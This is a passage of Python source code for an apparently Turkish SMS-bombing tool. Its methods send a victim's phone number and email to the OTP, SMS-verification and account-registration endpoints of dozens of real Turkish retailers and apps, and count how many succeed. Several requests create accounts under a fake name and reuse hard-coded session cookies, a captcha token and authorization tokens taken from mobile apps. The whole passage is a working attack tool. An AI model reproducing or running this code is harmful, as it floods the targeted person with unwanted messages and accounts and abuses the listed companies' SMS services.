        	"__reCAPTCHAVerificationToken": "03AGdBq26zV1jYt3RM1kdow0gpFcD7veljQAdV-0QoKLQIWi3voe27TlOwjbktguXtHgngHy13jsTzudfoNuLowIdqG1RcX4_XP5VoXy4un214kmTqChIDJPMKWvkUmLfXvWvXNTdajueI0T4zkdX2VGLz1Vn-uQxRRWxXjY81GZQlLUqu3oOSDYLBN2JH5DPh79Ms4BAxrTFC-ywWIWN1VVN5R2S6R6Ew7iyhDN_QQ1Ow5XcKuT7ycZbMrC_GUML5sKeDgoOtvm4pZ75LKX8ZArd9EPM783h0AXXVMedFGxa0V7a6_FocQ_7PRHeyOnku-HyoMgGZgB7cSIu6tPNddtYGLbOMGhR-2EyCtW4qKq1a9yceT-v7nequ9S0Cr-gYhb7DkjUyk56oUaZD6Za2NzqxIHPzfWC2M9x8WWeiWFqGSCHhjtL29UzGV8HH38X85BEpJKUVc_1U",
        	"Mobile": self.phone,
        }, cookies={
        		"__RequestVerificationToken": "zavKdfCRqVPRUTX-52rcfG8yfGNVfs10gNOb5RIn16upRTctGH4nBp8ReSMxzZUN4cJQTcvY0b4uzP6AL0inDD_cFyA1",
        		"_ga": "GA1.3.1016548678.1638216163",
        		"_gat": "1",
        		"_gat_gtag_UA_18913632_14": "1",
        		"_gid": "GA1.3.1214889554.1638216163",
        		"ai_session": "lsdsMzMdX841eBwaKMxd8e|1638216163472|1638216163472",
        		"ai_user": "U+ClfGV5d2ZK1W1o19UNDn|2021-11-29T20:02:43.148Z"
        	})
        try:
            BeautifulSoup(dsmartgo.text, "html.parser").find("div", {"class": "info-text"}).text.strip()
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> dsmartgo.com.tr")
        except AttributeError:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> dsmartgo.com.tr")
            self.adet += 1
        

    # kigili.com
    def Kigili(self):    
        try:
            kigili = requests.post("https://www.kigili.com/users/registration/", data={
                "first_name": "Memati",
                "last_name": "Bas",
                "email": self.mail,
                "phone": f"0{self.phone}",
                "password": "31ABC..abc31",
                "confirm": "true",
                "kvkk": "true",
                "next": ""
            })
            if kigili.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> kigili.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> kigili.com")
        

    #kahvedunyasi.com
    def KahveDunyasi(self):    
        try:    
            kahve_dunyasi = requests.post("https://core.kahvedunyasi.com/api/users/sms/send", data={
                "mobile_number": self.phone,
                "token_type": "register_token"
            })
            if len(kahve_dunyasi.json()["meta"]["messages"]["error"]) == 0:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> core.kahvedunyasi.com")
                self.adet += 1
            else:
                raise
        except:    
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> core.kahvedunyasi.com")
        

    #naosstars.com
    def NaosStars(self):
        try:
            naosstars = requests.post("https://shop.naosstars.com/users/register/", data={
                "email": self.mail,
                "first_name": "Memati",
                "last_name": "Bas",
                "password": "31ABC..abc31",
                "date_of_birth": "1975-12-31",
                "phone": f"0{self.phone}",
                "gender": "male",
                "kvkk": "true",
                "contact": "true",
                "confirm": "true"
            })
            if naosstars.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> shop.naosstars.com")
                self.adet += 1 
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> shop.naosstars.com")
          
        
    #wmf.com.tr
    def Wmf(self):
        try:
            wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
                "confirm": "true",
                "date_of_birth": "1956-03-01",
                "email": self.mail,
                "email_allowed": "true",
                "first_name": "Memati",
                "gender": "male",
                "last_name": "Bas",
                "password": "31ABC..abc31",
                "phone": f"0{self.phone}"
            })
            if wmf.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
                self.adet += 1   
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")
         
    
    #istegelsin.com
    def IsteGelsin(self):
        try:
            json={"operationName": "SendOtp2", "query": "mutation SendOtp2($phoneNumber: String!) {\n  sendOtp2(phoneNumber: $phoneNumber) {\n    __typename\n    alreadySent\n    remainingTime\n  }\n}", "variables": {"phoneNumber": "90"+str(self.phone)}}
            r = requests.post("https://prod.fasapi.net:443/",  json=json)
            if (r.json()["data"]["sendOtp2"]["alreadySent"]) == False:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> prod.fasapi.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> prod.fasapi.net")
    
    
    #bim
    def Bim(self):
        try:
            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone})
            if bim.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bim.veesk.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bim.veesk.net")
            
        
    #ceptesok.com
    def Sok(self):
        try:
            r = requests.post("https://api.ceptesok.com:443/api/users/sendsms",  json={"mobile_number": self.phone, "token_type": "register_token"})
            if len(r.json()["meta"]["messages"]["success"]) != 0:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.ceptesok.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.ceptesok.com")
            
    
    #tiklagelsin.com
    def Tiklagelsin(self):
        try:
            json={"operationName": "GENERATE_OTP", 
                        "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", 
                        "variables": {"challenge": "f2523023-283e-46be-b8db-c08f27d3e21c", 
                                    "deviceUniqueId": "3D7C1B44-7F5D-44FC-B3F2-A1024B3AF6D3", 
                                    "phone": self.phone
                                    }
                        }
            tiklagelsin = requests.post("https://svc.apps.tiklagelsin.com:443/user/graphql", json=json)
            if tiklagelsin.json()["data"]["generateOtp"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> svc.apps.tiklagelsin.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> svc.apps.tiklagelsin.com")
            
    
    #migros.com.tr
    def Migros(self):
        try:
            migros = requests.post("https://rest.migros.com.tr:443/sanalmarket/users/login/otp",  json={"phoneNumber": self.phone})
            if migros.json()["successful"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> rest.migros.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> rest.migros.com.tr")
            
    
    #a101.com.tr
    def A101(self):
        try:
            url = "https://www.a101.com.tr:443/users/otp-login/"
            data = {"phone": f"0{self.phone}", "next": "/a101-kapida"}
            r = requests.post(url,data=data)
            if (r.status_code) == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> a101.com.tr")
                self.adet += 1
            else:
                raise 
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> a101.com.tr")


    #englishhome.com
    def Englishhome(self):
        try:
            data = {"first_name": "Memati", "last_name": "Bas", "email": self.mail, "phone": f"0{self.phone}", "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"}
            home = requests.post("https://www.englishhome.com:443/enh_app/users/registration/", data=data)
            if home.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> englishhome.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> englishhome.com")
            
            
    #sakasu.com.tr
    def Sakasu(self):
        try:
            data = {"phone": self.phone}
            su = requests.post("https://www.sakasu.com.tr:443/app/api_register/step1", data=data)
            if su.json()["status"] == "ok":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> sakasu.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> sakasu.com.tr")
            
    
    #rentiva.com
    def Rentiva(self): 
        try:
            url = "https://rentiva.com:443/api/Account/Login"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "ionic://localhost", "Accept-Encoding": "gzip, deflate", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", "Accept-Language": "tr-TR,tr;q=0.9"}
            json={"appleId": None, "code": "", "email": "", "facebookId": None, "googleId": None, "lastName": "", "name": "", "phone": self.phone, "type": 1}
            rentiva = requests.post(url, headers=headers, json=json)
            if rentiva.json()["success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> rentiva.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> rentiva.com")
            
    
    #bineq.tech
    def Bineq(self):
        try:
            url = f"https://bineqapi.heymobility.tech:443/V2//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/116 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr"}
            bineq = requests.post(url, headers=headers)
            if bineq.json()["IsSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bineqapi.heymobility.tech")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bineqapi.heymobility.tech")
            
            
    #superpedestrian.com
    def Link(self):
        try:
            url = "https://consumer-auth.linkfleet.de:443/consumer_auth/register"
            json={"phone_number": f"+90{self.phone}"}
            link = requests.post(url, json=json)
            if link.json()["detail"] == "Ok":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> consumer-auth.linkfleet.de")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> consumer-auth.linkfleet.de")

            
    #loncamarket.com
    def Lonca(self):
        try:
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json; charset=utf-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.loncamarket.com", "Dnt": "1", "Referer": "https://www.loncamarket.com/bayi/basvuru/sozlesme", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}
            json={"Address": self.phone, "ConfirmationType": 0}
            lonca = requests.post("https://www.loncamarket.com/lid/identity/sendconfirmationcode", headers=headers, json=json, verify=False, timeout=3)
            if lonca.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> loncamarket.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> loncamarket.com")   
            
    
    #dgnonline.com
    def Dgn(self):
        try:
            url = "https://odeme.dgnonline.com:443/index.php?route=ajax/smsconfirm&type=send&ajax=1"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://odeme.dgnonline.com", "Dnt": "1", "Referer": "https://odeme.dgnonline.com/?bd=1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
            data = {"loginIdentityNumber": "00000000000", "loginMobileNumber": self.phone}
            dgn = requests.post(url, headers=headers, data=data)
            if dgn.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> odeme.dgnonline.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> odeme.dgnonline.com")  
            
    
    #yaanimail.com
    def Yaani(self):
        try:
            url = "https://api.yaanimail.com:443/gateway/v1/accounts/verification-code/send"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Content-Type": "application/json"}
            json={"action": "create", "email": f"{''.join(choice(ascii_lowercase) for i in range(19))}@yaani.com", "language": "tr", "recovery_options": [{"type": "email", "value": self.mail}, {"type": "msisdn", "value": f"90{self.phone}"}]}
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 204:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.yaanimail.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.yaanimail.com")  
            
             
    #defacto.com.tr
    def Defacto(self):
        try:
            url = "https://www.defacto.com.tr:443/Customer/SendPhoneConfirmationSms"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.defacto.com.tr/Login?newUser=True&ReturnUrl=%2FCustomer%2FSendPhoneConfirmationSms", "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.defacto.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
            data = {"mobilePhone": self.phone}
            r = requests.post(url, headers=headers, data=data)
            if r.json()["Data"]["IsSMSSend"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> defacto.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> defacto.com.tr")
    
    
    #mopas.com.tr
    def Mopas(self):
        try:
            r = requests.get(f"https://mopas.com.tr/sms/activation?mobileNumber={self.phone}&pwd=&checkPwd=")
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mopas.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mopas.com.tr")
            
    
    #icq.net
    def Icq(self):
        try:
            url = "https://u.icq.net:443/api/v92/rapi/auth/sendCode"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json", "Origin": "https://web.icq.com", "Dnt": "1", "Referer": "https://web.icq.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "cross-site", "Te": "trailers"}
            json={"params": {"application": "icq", "devId": "ic1rtwz1s1Hj1O0r", "language": "en-US", "phone": f"90{self.phone}", "route": "sms"}, "reqId": "25299-1669396271"}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["status"]["code"] == 20000:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> u.icq.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> u.icq.net")
            
    
    #boyner.com
    def Boyner(self):
        try:
            url = "https://www.boyner.com.tr:443/v2/customerV2/Register"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.boyner.com.tr/uyelik?type=uye-ol", "X-Newrelic-Id": "Vg8GVlZWCBACUFVRAwkEUFY=", "Newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI5MTcwNTAiLCJhcCI6IjMyMjUzNjA4MiIsImlkIjoiODE3YTIyZTZhODQ0OTJlNCIsInRyIjoiMTM0MWRkZThjZWVmMTExMjQ3MGE4NDQ2M2I1YWU4NzgiLCJ0aSI6MTY3MDU1MzA1OTMzNn19", "Traceparent": "00-1341dde8ceef1112470a84463b5ae878-817a22e6a84492e4-01", "Tracestate": "2917050@nr=0-1-2917050-322536082-817a22e6a84492e4----1670553059336", "Content-Type": "application/json;charset=utf-8", "Origin": "https://www.boyner.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
            json={"Captcha": "", "CaptchaTurn": False, "ConfirmNewPassword": "31ABC..abc31", "isGuestQuickBuy": "false", "Main": {"CellPhone": self.phone, "day": "31", "Email": self.mail, "FirstName": "Memati", "genderid": "1", "LastName": "Baş", "month": "12", "ReceiveCampaignMessages": True, "year": 1972}, "MembershipAgreement": True, "MembershipAgreementClone": True, "NewPassword": "31ABC..abc31", "ReturnUrl": "/"}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["Success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> boyner.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> boyner.com")
            

    #watsons.com.tr
    def Watsons(self):
        try:
            url = "https://www.watsons.com.tr:443/api/v2/wtctr/phone-verification/phonenumber?lang=tr_TR"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0", "Accept": "application/json", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.watsons.com.tr/register", "Content-Type": "application/json;charset=UTF-8", "X-Dtpc": "11$208941126_619h150vEGITDHTLQJAGKPKRHUIMTILDMPAWJTOL-0e0", "Origin": "https://www.watsons.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Pragma": "no-cache", "Cache-Control": "no-cache", "Te": "trailers"}
            json={"countryCode": "TR", "phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 201:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> watsons.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> watsons.com.tr")
            
    
    #buyursungelsin.com
    def Buyur(self):
        try:
            url = "https://app.buyursungelsin.com:443/api/customer/form/check"
            headers = {"Accept": "*/*", "Content-Type": "multipart/form-data; boundary=m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M", "Accept-Encoding": "gzip, deflate", "Authorization": "Basic Z2Vsc2luYXBwOjR1N3ghQSVEKkctS2FOZFJnVWtYcDJzNXY4eS9CP0UoSCtNYlFlU2hWbVlxM3Q2dzl6JEMmRilKQE5jUmZValduWnI0dTd4IUElRCpHLUthUGRTZ1ZrWXAyczV2OHkvQj9FKEgrTWJRZVRoV21acTR0Nnc5eiRDJkYpSkBOY1Jm", "User-Agent": "Gelsinapp/30 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9"}
            data = f"--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"fonksiyon\"\r\n\r\ncustomer/form/check\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"method\"\r\n\r\nPOST\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"telephone\"\r\n\r\n{self.phone}\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M--\r\n"
            r = requests.post(url, headers=headers, data=data)
            if (r.status_code) == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> app.buyursungelsin.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> app.buyursungelsin.com")
            
    
    #idealdata.com.tr
    def Osmanlideal(self):
        try:
            r = requests.get(f"https://osmgck.idealdata.com.tr:7850/X%02REQ_SMSDEMO%02{self.mail}%020{self.phone}")
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> osmgck.idealdata.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> osmgck.idealdata.com.tr")
            
    
    #pinarsu.com.tr
    def Pinar(self):
        try:
            url = "https://pinarsumobileservice.yasar.com.tr:443/pinarsu-mobil/api/Customer/SendOtp"
            headers = {"Content-Type": "application/json", "Devicetype": "ios", "Accept": "*/*", "Authorization": "bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJJZCI6ImMyZGFiNzVmLTUxNTUtNGQ4NS1iZjkxLWNkYjQxOTkwMTRiZCIsImlzcyI6Imh0dHA6Ly9sb2NhbGhvc3QvIiwiYXVkIjoiaHR0cDovL2xvY2FsaG9zdC8iLCJpYXQiOjE2NzEyODI2NDcsImV4cCI6MTY4MTY1MDY0N30.WkjMSCamAiYXbanSHYE6LxzII-BjZRtjdyYKMcToWHg", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Level": "40202", "Accountid": "062511D3-BF52-4441-A29B-8250E3900931", "Accept-Encoding": "gzip, deflate", "User-Agent": "Yasam Pinarim/4.2.2 (com.pinarsu.PinarSu; build:11; iOS 15.6.1) Alamofire/4.2.2", "Languageid": "D4FF115D-1AB5-4141-8719-A102C3CF9F1E", "Connection": "close"}
            json={"MobilePhone": self.phone}
            r = requests.post(url, headers=headers, json=json)
            if r.text == "true":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> pinarsumobileservice.yasar.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> pinarsumobileservice.yasar.com.tr")
            
    
    #suiste.com
    def Suiste(self):
        try:
            url = "https://suiste.com:443/api/auth/code"
            headers = {"Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "User-Agent": "suiste/1.5.10 (com.mobillium.suiste; build:1228; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr", "Accept-Encoding": "gzip, deflate"}
            data = {"action": "register", "gsm": self.phone}
            r = requests.post(url, headers=headers, data=data)
            if r.json()["code"] == "common.success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> suiste.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> suiste.com")
            
            
    #hayatsu.com.tr
    def Hayat(self):
        try:
            url = "https://www.hayatsu.com.tr:443/api/signup/otpsend"
            json={"mobilePhoneNumber": self.phone}
            r = requests.post(url, json=json)
            if (r.json()["IsSuccessful"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> hayatsu.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> hayatsu.com.tr")
            
            
    #pisir.com
    def Pisir(self):
        try:
            r = requests.post("https://api.pisir.com:443/v1/login/",  json={"app_build": "343", "app_platform": "ios", "msisdn": self.phone})
            if r.json()["ok"] == "1":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.pisir.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.pisir.com")
                
    
    #KimGbIster
    def KimGb(self):
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{self.phone}"})
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")


    #ikinciyeni.com
    def IkinciYeni(self):
        try:
            url = "https://apigw.ikinciyeni.com:443/RegisterRequest"
            json={"accounttype": 1, "email": self.mail, "isAddPermission": True, "lastName": "Bas", "name": "Memati", "phone": self.phone}
            r = requests.post(url, json=json)
            if (r.json()["isSucceed"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> apigw.ikinciyeni.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> apigw.ikinciyeni.com")
            
            
    #terrapizza.com.tr
    def Terra(self):
        try:
            url = "https://api.terrapizza.com.tr:443/api/v1/customers"
            json={"email": self.mail, "emailPermitted": True, "kvkApproved": True, "name": "Memati", "phone": str(self.phone), "smsPermitted": True, "surname": "Bas", "userAgreementApproved": True}
            r = requests.post(url,  json=json)
            if (r.status_code) == 201:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.terrapizza.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.terrapizza.com.tr")
            
            
    #ipragaz.com.tr
    def IpraGaz(self):
        try:
            url = "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
            json={"birthDate": "31/08/1975", "carPlate": "31 ABC 31", "name": "Memati Bas", "otp": "", "phoneNumber": str(self.phone), "playerId": ""}
            r = requests.post(url, json=json)
            if (r.json()["phoneNumber"]) == str(self.phone):
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ipapp.ipragaz.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ipapp.ipragaz.com.tr")
            
             
    #mogazmobilapinew.aygaz.com.tr
    def Mogaz(self):
        try:
            url = "https://mogazmobilapinew.aygaz.com.tr:443/api/Member/UserRegister"
